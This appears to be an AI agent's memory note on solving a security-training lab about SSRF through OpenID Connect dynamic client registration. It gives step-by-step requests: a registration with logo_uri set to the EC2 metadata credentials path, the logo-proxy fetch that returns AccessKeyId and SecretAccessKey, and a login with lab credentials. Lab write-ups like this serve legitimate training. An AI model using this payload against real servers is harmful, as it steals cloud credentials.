---
metadata:
  node_type: memory
name: "Lab OAuth SSRF OpenID dynamic client registration"
description: "OIDC dynamic registration SSRF: logo_uri to /client/id/logo proxies EC2 metadata; secret key submitted, banner solved."
last_updated: 2026-10-10T13:48:13+08:00
created: 2026-10-10T13:48:13+08:00
---

Solved 2026-10-10, arm A, fresh instance.

Chain (blog lab host to oauth-server host):
1. /social-login on the blog host leaks the IdP base in a meta refresh: https://oauth-ID.oauth-server.net/auth?client_id=...&redirect_uri=BLOG/oauth-callback&response_type=code&scope=openid%20profile%20email
2. /.well-known/openid-configuration on the oauth host gives authorization_endpoint=/auth; /reg is an Express route (GET answers "unrecognized route or not allowed method (GET on /reg)", 404), so POST-only.
3. POST /reg with JSON redirect_uris plus logo_uri=http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/ returns 201 with client_id, client_secret, registration_client_uri, registration_access_token.
4. Consent page /interaction/UID (reached via /auth redirect, then login wiener:peter at /interaction/UID/login) renders an img src="/client/ID/logo".
5. GET /client/CLIENT_ID/logo performs the server-side fetch of the registered logo_uri and returns the upstream body verbatim with content-type application/json, so the EC2 metadata JSON with AccessKeyId and SecretAccessKey comes back directly.
6. POST answer=SecretAccessKey to the blog host /submitSolution returns {"correct":true}; banner solved.

Piece notes:
- http_dump --follow on /auth lost the path-scoped _interaction cookie and produced SessionNotFound; http_session get/post --follow --jar carries path-scoped cookies correctly (hop trace shows sent_cookie) and --out saves the body for reading.
- The interaction UID changes on every /auth hit; read it from the saved page (form action /interaction/UID/login) before POSTing the login.

